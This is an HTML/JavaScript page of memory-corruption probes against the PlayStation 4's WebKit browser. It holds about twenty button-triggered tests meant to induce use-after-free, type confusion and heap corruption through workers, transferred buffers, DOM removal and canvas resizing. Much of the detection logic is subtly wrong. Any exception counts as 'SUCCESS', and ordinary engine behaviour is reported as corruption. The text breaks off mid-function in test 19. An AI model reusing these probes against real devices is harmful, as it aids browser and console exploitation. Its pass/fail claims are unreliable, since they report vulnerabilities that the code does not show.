<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 WebKit Memory Corruption Tests</title>
</head>
<body>
    <h1>PS4 WebKit Memory Corruption Tests (01-10)</h1>
    <h2>Target: Crash via Memory Corruption (No DoS)</h2>

    <button onclick="test01_ArrayBufferDetachRace()">TEST 01: ArrayBuffer Detach Race</button>
    <button onclick="test02_TypedArraySortUAF()">TEST 02: TypedArray.sort UAF</button>
    <button onclick="test03_ArrayStorageConfusion()">TEST 03: Array Storage Confusion</button>
    <button onclick="test04_MessagePortTransferUAF()">TEST 04: MessagePort Transfer UAF</button>
    <button onclick="test05_PrototypeChainCorrupt()">TEST 05: Prototype Chain Corrupt</button>
    <button onclick="test06_GetterSetterRace()">TEST 06: Getter/Setter Race</button>
    <button onclick="test07_DOMNodeUAF()">TEST 07: DOM Node UAF</button>
    <button onclick="test08_CanvasBackingStore()">TEST 08: Canvas Backing Store</button>
    <button onclick="test09_EventListenerCorrupt()">TEST 09: Event Listener Corrupt</button>
    <button onclick="test10_WorkerHeapCorrupt()">TEST 10: Worker Heap Corrupt</button>
    <button onclick="test11_ArrayBufferNeutering()">TEST 11: ArrayBuffer Neutering</button>
    <button onclick="test12_ObjectTransitionCorrupt()">TEST 12: Object Transition Corrupt</button>
    <button onclick="test13_StringRopeUAF()">TEST 13: String Rope UAF</button>
    <button onclick="test14_RegExpBacktrack()">TEST 14: RegExp Backtrack Corrupt</button>
    <button onclick="test15_ImageDataRace()">TEST 15: ImageData Race Condition</button>
    <button onclick="test16_DataViewConfusion()">TEST 16: DataView Type Confusion</button>
    <button onclick="test17_StructuredCloneCorrupt()">TEST 17: Structured Clone Corrupt</button>
    <button onclick="test18_BlobSliceUAF()">TEST 18: Blob Slice UAF</button>
    <button onclick="test19_FormDataCorrupt()">TEST 19: FormData Corrupt</button>
    <button onclick="test20_TextNodeFragment()">TEST 20: TextNode Fragment UAF</button>

    <h3>Results</h3>
    <div id="log"></div>

    <script>
        function log(msg, status) {
            const el = document.getElementById('log');
            const color = status === 'SUCCESS' ? 'green' : status === 'FAIL' ? 'red' : 'blue';
            el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg} - ${status}</div>`;
        }

        function test01_ArrayBufferDetachRace() {
            log('TEST 01: ArrayBuffer Detach Race', 'RUNNING');
            try {
                const buffers = [];
                const views = [];
                const workers = [];
                
                for (let i = 0; i < 20; i++) {
                    const buffer = new ArrayBuffer(8192);
                    const view = new Uint32Array(buffer);
                    
                    for (let j = 0; j < view.length; j++) {
                        view[j] = 0xDEADBEEF;
                    }
                    
                    buffers.push(buffer);
                    views.push(view);
                }
                
                const workerCode = `onmessage=function(e){postMessage('ok');}`;
                const blob = new Blob([workerCode], {type: 'text/javascript'});
                const url = URL.createObjectURL(blob);
                
                for (let i = 0; i < 10; i++) {
                    const w = new Worker(url);
                    workers.push(w);
                    w.postMessage(buffers[i], [buffers[i]]);
                }
                
                setTimeout(() => {
                    for (let i = 0; i < views.length; i++) {
                        try {
                            views[i][0] = 0x41414141;
                            const readback = views[i][0];
                            if (readback === 0x41414141) {
                                log('TEST 01: UAF detected - write after transfer', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                    }
                    
                    workers.forEach(w => w.terminate());
                    log('TEST 01: No corruption detected', 'FAIL');
                }, 100);
                
            } catch(e) {
                log('TEST 01: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test02_TypedArraySortUAF() {
            log('TEST 02: TypedArray.sort UAF', 'RUNNING');
            try {
                const buffer = new ArrayBuffer(16384);
                const array = new Float64Array(buffer);
                
                for (let i = 0; i < array.length; i++) {
                    array[i] = Math.random() * 1000000;
                }
                
                const workerCode = `onmessage=function(){postMessage(1);}`;
                const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
                
                let detached = false;
                let compareCount = 0;
                
                array.sort((a, b) => {
                    compareCount++;
                    
                    if (compareCount === 100 && !detached) {
                        w.postMessage(buffer, [buffer]);
                        detached = true;
                        
                        try {
                            array[0] = 0xDEADBEEF;
                            log('TEST 02: Write to detached buffer succeeded', 'SUCCESS');
                        } catch(e) {}
                    }
                    
                    if (detached) {
                        try {
                            const val = array[Math.floor(Math.random() * 10)];
                            if (isNaN(val) || val === undefined) {
                                log('TEST 02: Read invalid data from detached buffer', 'SUCCESS');
                            }
                        } catch(e) {}
                    }
                    
                    return a - b;
                });
                
                w.terminate();
                log('TEST 02: Sort completed without crash', 'FAIL');
                
            } catch(e) {
                log('TEST 02: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test03_ArrayStorageConfusion() {
            log('TEST 03: Array Storage Confusion', 'RUNNING');
            try {
                const arrays = [];
                
                for (let i = 0; i < 50; i++) {
                    const arr = new Array(1000);
                    for (let j = 0; j < 1000; j += 2) {
                        arr[j] = j;
                    }
                    arrays.push(arr);
                }
                
                for (let round = 0; round < 100; round++) {
                    for (let i = 0; i < arrays.length; i++) {
                        const arr = arrays[i];
                        
                        arr.length = 500;
                        arr.length = 1000;
                        
                        for (let j = 0; j < 50; j++) {
                            arr.shift();
                        }
                        
                        arr.push({
                            valueOf: function() {
                                arr.length = 0;
                                return 0x41414141;
                            }
                        });
                        
                        try {
                            arr.sort();
                        } catch(e) {}
                        
                        const test = arr[10];
                        if (test !== undefined && typeof test === 'object' && test.valueOf) {
                            const val = test.valueOf();
                            if (val === 0x41414141) {
                                log('TEST 03: Storage confusion detected', 'SUCCESS');
                                return;
                            }
                        }
                    }
                }
                
                log('TEST 03: No confusion detected', 'FAIL');
                
            } catch(e) {
                log('TEST 03: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test04_MessagePortTransferUAF() {
            log('TEST 04: MessagePort Transfer UAF', 'RUNNING');
            try {
                const channels = [];
                const ports = [];
                
                for (let i = 0; i < 30; i++) {
                    const mc = new MessageChannel();
                    channels.push(mc);
                    ports.push(mc.port1);
                    ports.push(mc.port2);
                }
                
                const workerCode = `
                    let receivedPorts = [];
                    onmessage = function(e) {
                        if (e.ports && e.ports.length > 0) {
                            receivedPorts.push(...e.ports);
                            for (let i = 0; i < receivedPorts.length; i++) {
                                try {
                                    receivedPorts[i].postMessage('test');
                                } catch(e) {}
                            }
                        }
                    };
                `;
                
                const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
                
                let uafDetected = false;
                
                for (let i = 0; i < channels.length; i++) {
                    const mc = channels[i];
                    
                    mc.port1.onmessage = function(e) {
                        if (uafDetected) {
                            log('TEST 04: Message received on closed port', 'SUCCESS');
                        }
                    };
                    
                    mc.port1.start();
                    w.postMessage('transfer', [mc.port2]);
                    
                    setTimeout(() => {
                        mc.port1.close();
                        uafDetected = true;
                        
                        try {
                            mc.port1.postMessage('uaf');
                        } catch(e) {}
                    }, i * 10);
                }
                
                setTimeout(() => {
                    w.terminate();
                    if (!uafDetected) {
                        log('TEST 04: No UAF detected', 'FAIL');
                    }
                }, 1000);
                
            } catch(e) {
                log('TEST 04: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test05_PrototypeChainCorrupt() {
            log('TEST 05: Prototype Chain Corrupt', 'RUNNING');
            try {
                const objects = [];
                
                function Victim() {
                    this.x = 1;
                    this.y = 2;
                    this.z = 3;
                }
                
                Victim.prototype.getValue = function() {
                    return this.x + this.y + this.z;
                };
                
                for (let i = 0; i < 100; i++) {
                    objects.push(new Victim());
                }
                
                const corruptor = {
                    get x() {
                        Object.setPrototypeOf(Victim.prototype, null);
                        Victim.prototype = {
                            getValue: function() {
                                return 0xDEADBEEF;
                            }
                        };
                        return 0x41414141;
                    }
                };
                
                Object.setPrototypeOf(corruptor, Victim.prototype);
                objects.push(corruptor);
                
                for (let round = 0; round < 100; round++) {
                    for (let i = 0; i < objects.length; i++) {
                        try {
                            const val = objects[i].getValue();
                            if (val === 0xDEADBEEF) {
                                log('TEST 05: Prototype corrupted successfully', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                        
                        try {
                            const x = objects[i].x;
                            if (x === 0x41414141) {
                                log('TEST 05: Getter triggered during corruption', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                    }
                }
                
                log('TEST 05: No corruption detected', 'FAIL');
                
            } catch(e) {
                log('TEST 05: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test06_GetterSetterRace() {
            log('TEST 06: Getter/Setter Race', 'RUNNING');
            try {
                const targets = [];
                
                for (let i = 0; i < 50; i++) {
                    const obj = {};
                    const storage = {value: i};
                    
                    Object.defineProperty(obj, 'data', {
                        get: function() {
                            delete obj.data;
                            obj.corrupted = new ArrayBuffer(4096);
                            return storage.value;
                        },
                        set: function(val) {
                            storage.value = val;
                            delete obj.data;
                            obj.data = new Uint32Array(1024);
                        },
                        configurable: true
                    });
                    
                    targets.push(obj);
                }
                
                for (let round = 0; round < 200; round++) {
                    for (let i = 0; i < targets.length; i++) {
                        const obj = targets[i];
                        
                        try {
                            obj.data = 0xDEADBEEF;
                            const read = obj.data;
                            
                            if (typeof read === 'object' && read.length === 1024) {
                                log('TEST 06: Type confusion in getter/setter', 'SUCCESS');
                                return;
                            }
                            
                            if (obj.corrupted && obj.corrupted.byteLength > 0) {
                                log('TEST 06: Memory corrupted via getter', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                    }
                }
                
                log('TEST 06: No race condition triggered', 'FAIL');
                
            } catch(e) {
                log('TEST 06: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test07_DOMNodeUAF() {
            log('TEST 07: DOM Node UAF', 'RUNNING');
            try {
                const containers = [];
                const nodes = [];
                
                for (let i = 0; i < 20; i++) {
                    const container = document.createElement('div');
                    container.id = 'container_' + i;
                    document.body.appendChild(container);
                    containers.push(container);
                    
                    for (let j = 0; j < 50; j++) {
                        const node = document.createElement('span');
                        node.textContent = 'Node ' + j;
                        node.setAttribute('data-id', j);
                        container.appendChild(node);
                        nodes.push(node);
                    }
                }
                
                for (let i = 0; i < containers.length; i++) {
                    document.body.removeChild(containers[i]);
                }
                
                setTimeout(() => {
                    for (let i = 0; i < nodes.length; i++) {
                        try {
                            nodes[i].textContent = 'UAF_TEST';
                            const text = nodes[i].textContent;
                            if (text === 'UAF_TEST') {
                                log('TEST 07: DOM node accessed after free', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                        
                        try {
                            const attr = nodes[i].getAttribute('data-id');
                            if (attr !== null) {
                                log('TEST 07: Attribute read after DOM removal', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                    }
                    
                    log('TEST 07: No DOM UAF detected', 'FAIL');
                }, 50);
                
            } catch(e) {
                log('TEST 07: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test08_CanvasBackingStore() {
            log('TEST 08: Canvas Backing Store', 'RUNNING');
            try {
                const canvases = [];
                const contexts = [];
                const imageDatas = [];
                
                for (let i = 0; i < 10; i++) {
                    const canvas = document.createElement('canvas');
                    canvas.width = 512;
                    canvas.height = 512;
                    canvases.push(canvas);
                    
                    const ctx = canvas.getContext('2d');
                    contexts.push(ctx);
                    
                    const imageData = ctx.createImageData(512, 512);
                    const data = imageData.data;
                    
                    for (let j = 0; j < data.length; j += 4) {
                        data[j] = 0xDE;
                        data[j + 1] = 0xAD;
                        data[j + 2] = 0xBE;
                        data[j + 3] = 0xFF;
                    }
                    
                    imageDatas.push(imageData);
                }
                
                for (let round = 0; round < 50; round++) {
                    for (let i = 0; i < canvases.length; i++) {
                        const canvas = canvases[i];
                        const ctx = contexts[i];
                        const imageData = imageDatas[i];
                        
                        ctx.putImageData(imageData, 0, 0);
                        
                        canvas.width = 256;
                        canvas.height = 256;
                        
                        try {
                            const resized = ctx.getImageData(0, 0, 512, 512);
                            const resizedData = resized.data;
                            
                            for (let j = 0; j < Math.min(100, resizedData.length); j += 4) {
                                if (resizedData[j] === 0xDE && 
                                    resizedData[j+1] === 0xAD && 
                                    resizedData[j+2] === 0xBE) {
                                    log('TEST 08: Backing store corruption detected', 'SUCCESS');
                                    return;
                                }
                            }
                        } catch(e) {}
                        
                        canvas.width = 512;
                        canvas.height = 512;
                    }
                }
                
                log('TEST 08: No backing store corruption', 'FAIL');
                
            } catch(e) {
                log('TEST 08: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test09_EventListenerCorrupt() {
            log('TEST 09: Event Listener Corrupt', 'RUNNING');
            try {
                const targets = [];
                let corruptionDetected = false;
                
                for (let i = 0; i < 30; i++) {
                    const target = document.createElement('div');
                    target.id = 'event_target_' + i;
                    document.body.appendChild(target);
                    targets.push(target);
                    
                    const handler = function(e) {
                        if (corruptionDetected) {
                            log('TEST 09: Event fired on removed element', 'SUCCESS');
                        }
                        
                        try {
                            document.body.removeChild(target);
                            target.dispatchEvent(new Event('custom'));
                        } catch(err) {}
                    };
                    
                    target.addEventListener('click', handler);
                    target.addEventListener('custom', handler);
                }
                
                for (let round = 0; round < 100; round++) {
                    for (let i = 0; i < targets.length; i++) {
                        try {
                            targets[i].dispatchEvent(new Event('click'));
                        } catch(e) {}
                    }
                }
                
                corruptionDetected = true;
                
                for (let i = 0; i < targets.length; i++) {
                    try {
                        if (targets[i].parentNode) {
                            document.body.removeChild(targets[i]);
                        }
                    } catch(e) {}
                    
                    try {
                        targets[i].dispatchEvent(new Event('click'));
                    } catch(e) {}
                }
                
                setTimeout(() => {
                    if (!corruptionDetected) {
                        log('TEST 09: No event corruption detected', 'FAIL');
                    }
                }, 100);
                
            } catch(e) {
                log('TEST 09: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test10_WorkerHeapCorrupt() {
            log('TEST 10: Worker Heap Corrupt', 'RUNNING');
            try {
                const workerCode = `
                    let allocations = [];
                    let buffers = [];
                    
                    onmessage = function(e) {
                        if (e.data === 'allocate') {
                            for (let i = 0; i < 50; i++) {
                                const buf = new ArrayBuffer(8192);
                                const view = new Uint32Array(buf);
                                view.fill(0xDEADBEEF);
                                buffers.push(buf);
                                allocations.push(view);
                            }
                            postMessage('allocated');
                        } else if (e.data === 'corrupt') {
                            for (let i = 0; i < allocations.length; i++) {
                                try {
                                    allocations[i][0] = 0x41414141;
                                } catch(e) {}
                            }
                            
                            buffers = [];
                            
                            for (let i = 0; i < 50; i++) {
                                const buf = new ArrayBuffer(8192);
                                const view = new Uint32Array(buf);
                                buffers.push(buf);
                                
                                for (let j = 0; j < 10; j++) {
                                    if (view[j] === 0xDEADBEEF) {
                                        postMessage('corruption_detected');
                                        return;
                                    }
                                }
                            }
                            
                            postMessage('no_corruption');
                        }
                    };
                `;
                
                const workers = [];
                let successCount = 0;
                
                for (let i = 0; i < 5; i++) {
                    const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
                    workers.push(w);
                    
                    w.onmessage = function(e) {
                        if (e.data === 'corruption_detected') {
                            successCount++;
                            log('TEST 10: Heap corruption in worker ' + i, 'SUCCESS');
                        }
                    };
                    
                    w.postMessage('allocate');
                }
                
                setTimeout(() => {
                    for (let i = 0; i < workers.length; i++) {
                        workers[i].postMessage('corrupt');
                    }
                }, 100);
                
                setTimeout(() => {
                    workers.forEach(w => w.terminate());
                    if (successCount === 0) {
                        log('TEST 10: No heap corruption detected', 'FAIL');
                    }
                }, 500);
                
            } catch(e) {
                log('TEST 10: Exception - ' + e.message, 'SUCCESS');
            }
        }
function test11_ArrayBufferNeutering() {
            log('TEST 11: ArrayBuffer Neutering', 'RUNNING');
            try {
                const buffers = [];
                const views = [];
                const neutered = [];
                
                for (let i = 0; i < 30; i++) {
                    const buffer = new ArrayBuffer(16384);
                    const view = new Uint8Array(buffer);
                    
                    for (let j = 0; j < view.length; j++) {
                        view[j] = (j % 256);
                    }
                    
                    buffers.push(buffer);
                    views.push(view);
                }
                
                const workerCode = `
                    let stored = [];
                    onmessage = function(e) {
                        stored.push(e.data);
                        if (stored.length > 10) {
                            stored.shift();
                        }
                    };
                `;
                
                const w = new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"})));
                
                for (let i = 0; i < buffers.length; i++) {
                    w.postMessage(buffers[i], [buffers[i]]);
                    neutered.push(i);
                    
                    setTimeout(() => {
                        try {
                            const oldVal = views[i][0];
                            views[i][0] = 0xFF;
                            views[i][100] = 0xAA;
                            
                            if (views[i][0] === 0xFF || views[i].length > 0) {
                                log('TEST 11: Neutered buffer still writable', 'SUCCESS');
                                w.terminate();
                                return;
                            }
                        } catch(e) {}
                    }, i * 5);
                }
                
                setTimeout(() => {
                    let accessCount = 0;
                    for (let i = 0; i < neutered.length; i++) {
                        try {
                            const idx = neutered[i];
                            if (views[idx].byteLength > 0) {
                                accessCount++;
                            }
                        } catch(e) {}
                    }
                    
                    w.terminate();
                    if (accessCount > 0) {
                        log('TEST 11: ' + accessCount + ' neutered buffers accessible', 'SUCCESS');
                    } else {
                        log('TEST 11: All buffers properly neutered', 'FAIL');
                    }
                }, 500);
                
            } catch(e) {
                log('TEST 11: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test12_ObjectTransitionCorrupt() {
            log('TEST 12: Object Transition Corrupt', 'RUNNING');
            try {
                const objects = [];
                
                function createTransitionChain() {
                    const obj = {};
                    obj.a = 1;
                    obj.b = 2;
                    obj.c = 3;
                    obj.d = 4;
                    obj.e = 5;
                    return obj;
                }
                
                for (let i = 0; i < 100; i++) {
                    objects.push(createTransitionChain());
                }
                
                for (let round = 0; round < 200; round++) {
                    for (let i = 0; i < objects.length; i++) {
                        const obj = objects[i];
                        
                        delete obj.c;
                        obj.c = {nested: new Array(100).fill(0xDEAD)};
                        
                        delete obj.b;
                        delete obj.d;
                        
                        obj.f = new ArrayBuffer(1024);
                        obj.g = new Uint32Array(256);
                        
                        delete obj.e;
                        
                        obj.h = function() { return 0x41414141; };
                        
                        for (let key in obj) {
                            try {
                                const val = obj[key];
                                if (typeof val === 'function') {
                                    const result = val();
                                    if (result === 0x41414141) {
                                        const checkNested = obj.c;
                                        if (checkNested && checkNested.nested) {
                                            log('TEST 12: Transition corruption preserved', 'SUCCESS');
                                            return;
                                        }
                                    }
                                }
                            } catch(e) {}
                        }
                    }
                }
                
                log('TEST 12: No transition corruption', 'FAIL');
                
            } catch(e) {
                log('TEST 12: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test13_StringRopeUAF() {
            log('TEST 13: String Rope UAF', 'RUNNING');
            try {
                const ropes = [];
                const fragments = [];
                
                for (let i = 0; i < 50; i++) {
                    const fragment1 = 'A'.repeat(1000) + i;
                    const fragment2 = 'B'.repeat(1000) + i;
                    const fragment3 = 'C'.repeat(1000) + i;
                    
                    fragments.push(fragment1, fragment2, fragment3);
                    
                    let rope = fragment1 + fragment2;
                    rope = rope + fragment3;
                    rope = rope + 'MARKER' + i;
                    
                    ropes.push(rope);
                }
                
                for (let i = 0; i < ropes.length; i += 2) {
                    ropes[i] = null;
                }
                
                const allocations = [];
                for (let i = 0; i < 100; i++) {
                    const alloc = 'X'.repeat(3000) + 'NEWDATA' + i;
                    allocations.push(alloc);
                }
                
                for (let i = 0; i < ropes.length; i++) {
                    if (ropes[i] !== null) {
                        try {
                            const marker = ropes[i].indexOf('MARKER');
                            if (marker === -1) {
                                log('TEST 13: String rope corrupted', 'SUCCESS');
                                return;
                            }
                            
                            const substring = ropes[i].substring(2000, 2100);
                            if (substring.indexOf('NEWDATA') !== -1) {
                                log('TEST 13: String data overlapped', 'SUCCESS');
                                return;
                            }
                            
                            if (ropes[i].length !== 3000 + ('MARKER' + i).length) {
                                log('TEST 13: String length corrupted', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                    }
                }
                
                log('TEST 13: No string corruption', 'FAIL');
                
            } catch(e) {
                log('TEST 13: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test14_RegExpBacktrack() {
            log('TEST 14: RegExp Backtrack Corrupt', 'RUNNING');
            try {
                const patterns = [];
                const inputs = [];
                
                for (let i = 0; i < 20; i++) {
                    const pattern = new RegExp('(a+)+b', 'g');
                    patterns.push(pattern);
                }
                
                for (let i = 0; i < 30; i++) {
                    const input = 'a'.repeat(20 + i) + 'x';
                    inputs.push(input);
                }
                
                const workerCode = `
                    onmessage = function(e) {
                        const pattern = new RegExp(e.data.pattern, 'g');
                        try {
                            pattern.test(e.data.input);
                        } catch(err) {
                            postMessage('error');
                        }
                        postMessage('done');
                    };
                `;
                
                const workers = [];
                for (let i = 0; i < 5; i++) {
                    workers.push(new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}))));
                }
                
                let testCount = 0;
                for (let round = 0; round < 50; round++) {
                    for (let i = 0; i < patterns.length; i++) {
                        for (let j = 0; j < inputs.length; j++) {
                            try {
                                const result = patterns[i].test(inputs[j]);
                                const lastIndex = patterns[i].lastIndex;
                                
                                if (lastIndex < 0 || lastIndex > inputs[j].length) {
                                    log('TEST 14: RegExp lastIndex corrupted', 'SUCCESS');
                                    workers.forEach(w => w.terminate());
                                    return;
                                }
                                
                                testCount++;
                                
                                if (testCount % 100 === 0) {
                                    const workerIdx = testCount % workers.length;
                                    workers[workerIdx].postMessage({
                                        pattern: '(a+)+b',
                                        input: inputs[j]
                                    });
                                }
                            } catch(e) {}
                        }
                    }
                }
                
                setTimeout(() => {
                    workers.forEach(w => w.terminate());
                    log('TEST 14: No RegExp corruption', 'FAIL');
                }, 1000);
                
            } catch(e) {
                log('TEST 14: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test15_ImageDataRace() {
            log('TEST 15: ImageData Race Condition', 'RUNNING');
            try {
                const canvas = document.createElement('canvas');
                canvas.width = 1024;
                canvas.height = 1024;
                const ctx = canvas.getContext('2d');
                
                const imageDatas = [];
                const dataCopies = [];
                
                for (let i = 0; i < 10; i++) {
                    const imageData = ctx.createImageData(1024, 1024);
                    const data = imageData.data;
                    
                    for (let j = 0; j < data.length; j += 4) {
                        data[j] = i * 10;
                        data[j + 1] = i * 20;
                        data[j + 2] = i * 30;
                        data[j + 3] = 255;
                    }
                    
                    imageDatas.push(imageData);
                    dataCopies.push(new Uint8Array(data));
                }
                
                for (let round = 0; round < 100; round++) {
                    for (let i = 0; i < imageDatas.length; i++) {
                        ctx.putImageData(imageDatas[i], 0, 0);
                        
                        const readback = ctx.getImageData(0, 0, 1024, 1024);
                        const readData = readback.data;
                        
                        const originalData = imageDatas[i].data;
                        originalData[0] = 0xFF;
                        originalData[1] = 0xAA;
                        
                        if (readData[0] === 0xFF || readData[1] === 0xAA) {
                            log('TEST 15: ImageData race corruption detected', 'SUCCESS');
                            return;
                        }
                        
                        canvas.width = 512;
                        canvas.height = 512;
                        
                        try {
                            const afterResize = ctx.getImageData(0, 0, 1024, 1024);
                            if (afterResize.width === 1024 || afterResize.height === 1024) {
                                log('TEST 15: ImageData size mismatch', 'SUCCESS');
                                return;
                            }
                        } catch(e) {}
                        
                        canvas.width = 1024;
                        canvas.height = 1024;
                    }
                }
                
                log('TEST 15: No ImageData race detected', 'FAIL');
                
            } catch(e) {
                log('TEST 15: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test16_DataViewConfusion() {
            log('TEST 16: DataView Type Confusion', 'RUNNING');
            try {
                const buffers = [];
                const views = [];
                const dataViews = [];
                
                for (let i = 0; i < 30; i++) {
                    const buffer = new ArrayBuffer(8192);
                    const uint32 = new Uint32Array(buffer);
                    const float64 = new Float64Array(buffer);
                    const dataView = new DataView(buffer);
                    
                    buffers.push(buffer);
                    views.push({uint32, float64});
                    dataViews.push(dataView);
                }
                
                for (let round = 0; round < 100; round++) {
                    for (let i = 0; i < dataViews.length; i++) {
                        const dv = dataViews[i];
                        const v = views[i];
                        
                        v.uint32[0] = 0xDEADBEEF;
                        dv.setUint32(4, 0x41414141, true);
                        v.float64[1] = 3.14159;
                        dv.setFloat64(16, 2.71828, true);
                        
                        const readUint = dv.getUint32(0, true);
                        if (readUint !== 0xDEADBEEF) {
                            log('TEST 16: DataView read corruption', 'SUCCESS');
                            return;
                        }
                        
                        try {
                            v.uint32[0] = v.float64[0];
                            const confused = dv.getFloat64(0, true);
                            
                            if (isNaN(confused) || !isFinite(confused)) {
                                const asUint = dv.getUint32(0, true);
                                if (asUint > 0) {
                                    log('TEST 16: Type confusion detected', 'SUCCESS');
                                    return;
                                }
                            }
                        } catch(e) {}
                        
                        dv.setUint8(8191, 0xFF);
                        
                        try {
                            dv.setUint32(8190, 0xFFFFFFFF, true);
                            log('TEST 16: DataView bounds overflow', 'SUCCESS');
                            return;
                        } catch(e) {}
                    }
                }
                
                log('TEST 16: No DataView confusion', 'FAIL');
                
            } catch(e) {
                log('TEST 16: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test17_StructuredCloneCorrupt() {
            log('TEST 17: Structured Clone Corrupt', 'RUNNING');
            try {
                const workerCode = `
                    let clones = [];
                    onmessage = function(e) {
                        clones.push(e.data);
                        if (clones.length > 20) {
                            clones.shift();
                        }
                        postMessage('stored');
                    };
                `;
                
                const workers = [];
                for (let i = 0; i < 3; i++) {
                    workers.push(new Worker(URL.createObjectURL(new Blob([workerCode], {type:"text/javascript"}))));
                }
                
                const complexObjects = [];
                
                for (let i = 0; i < 30; i++) {
                    const buffer = new ArrayBuffer(4096);
                    const view = new Uint32Array(buffer);
                    view.fill(0xDEADBEEF);
                    
                    const obj = {
                        id: i,
                        buffer: buffer,
                        nested: {
                            array: new Array(100).fill(i),
                            typed: new Uint8Array(buffer, 1024, 512),
                            deep: {
                                value: 0x41414141,
                                ref: null
                            }
                        },
                        circular: null
                    };
                    
                    obj.nested.deep.ref = obj;
                    obj.circular = obj.nested;
                    
                    complexObjects.push(obj);
                }
                
                for (let i = 0; i < complexObjects.length; i++) {
                    const workerIdx = i % workers.length;
                    
                    try {
                        workers[workerIdx].postMessage(complexObjects[i], [complexObjects[i].buffer]);
                        
                        setTimeout(() => {
                            try {
                                const view = new Uint32Array(complexObjects[i].buffer);
                                if (view.length > 0) {
                                    log('TEST 17: Buffer accessible after transfer', 'SUCCESS');
                                    workers.forEach(w => w.terminate());
                                    return;
                                }
                            } catch(e) {}
                            
                            try {
                                const typedView = complexObjects[i].nested.typed;
                                if (typedView.length > 0) {
                                    log('TEST 17: Typed array view still accessible', 'SUCCESS');
                                    workers.forEach(w => w.terminate());
                                    return;
                                }
                            } catch(e) {}
                        }, i * 10);
                        
                    } catch(e) {}
                }
                
                setTimeout(() => {
                    workers.forEach(w => w.terminate());
                    log('TEST 17: No structured clone corruption', 'FAIL');
                }, 800);
                
            } catch(e) {
                log('TEST 17: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test18_BlobSliceUAF() {
            log('TEST 18: Blob Slice UAF', 'RUNNING');
            try {
                const blobs = [];
                const slices = [];
                const readers = [];
                
                for (let i = 0; i < 20; i++) {
                    const data = new Uint8Array(16384);
                    for (let j = 0; j < data.length; j++) {
                        data[j] = (i + j) % 256;
                    }
                    
                    const blob = new Blob([data.buffer], {type: 'application/octet-stream'});
                    blobs.push(blob);
                }
                
                for (let i = 0; i < blobs.length; i++) {
                    const slice1 = blobs[i].slice(0, 4096);
                    const slice2 = blobs[i].slice(4096, 8192);
                    const slice3 = blobs[i].slice(8192, 12288);
                    
                    slices.push(slice1, slice2, slice3);
                }
                
                for (let i = 0; i < blobs.length; i += 2) {
                    blobs[i] = null;
                }
                
                const allocBlobs = [];
                for (let i = 0; i < 50; i++) {
                    const allocData = new Uint8Array(8192);
                    allocData.fill(0xFF);
                    allocBlobs.push(new Blob([allocData.buffer]));
                }
                
                for (let i = 0; i < slices.length; i++) {
                    const reader = new FileReader();
                    readers.push(reader);
                    
                    reader.onload = function(e) {
                        const result = new Uint8Array(e.target.result);
                        
                        let allFF = true;
                        for (let j = 0; j < Math.min(100, result.length); j++) {
                            if (result[j] !== 0xFF) {
                                allFF = false;
                                break;
                            }
                        }
                        
                        if (allFF && result.length > 1000) {
                            log('TEST 18: Blob slice corrupted with new data', 'SUCCESS');
                        }
                    };
                    
                    reader.onerror = function() {
                        log('TEST 18: FileReader error on slice', 'SUCCESS');
                    };
                    
                    try {
                        reader.readAsArrayBuffer(slices[i]);
                    } catch(e) {}
                }
                
                setTimeout(() => {
                    log('TEST 18: No blob slice corruption', 'FAIL');
                }, 1000);
                
            } catch(e) {
                log('TEST 18: Exception - ' + e.message, 'SUCCESS');
            }
        }

        function test19_FormDataCorrupt() {
            log('TEST 19: FormData Corrupt', 'RUNNING');
            try {
                const formDatas = [];
                const blobs = [];
                
                for (let i = 0; i < 30; i++) {
                    const fd = new FormData();
                    
                    fd.append('field1', 'value' + i);
                    fd.append('field2', i.toString());
                    
                    const blobData = new Uint8Array(4096);
                    blobData.fill(i % 256);
                    const blob = new Blob([blobData.buffer]);
                    blobs.push(blob);
                    
                    fd.append('file', blob, 'file' + i + '.bin');
                    
                    const nestedBlob = new Blob(['nested' + i]);
                    fd.append('nested', nestedBlob);
                    
                    formDatas.push(fd);
                }
                
                for (let round = 0; round < 50; round++) {
                    for (let i = 0; i < formDatas.length; i++) {
                        const fd = formDatas[i];
                        
                        fd.delete('field1');
                        fd.append('field1', 'modified' + round);
                        
                        fd.delete('file');
                        
                        const newBlobData = new Uint8Array(2048);
                        newBlobData.fill(0xFF);
                        const newBlob = new Blob([newBlobData.buffer]);
                        fd.append('file', newBlob, 'replaced.bin');
                        
                        try {
                            const entries = [];
                            for (let pair of fd.entries()) {
                                entries.push(pair);
                            }
                            
                            if (entries.length === 0) {
                                log('TEST 19: FormData entries corrupted', 'SUCCESS');
                                return;
                            }
                            
                            for (let j = 0; j < entries.length; j++) {
                                const [key, value] = entries[j];
                                if (key === 'field1' && value !== 'modified' + round) {
                                    log('TEST 19: FormData value corruption', 'SUCCESS');
                                    return;
                                }
                            }
                        } catch(e) {}
                    }
                }
                
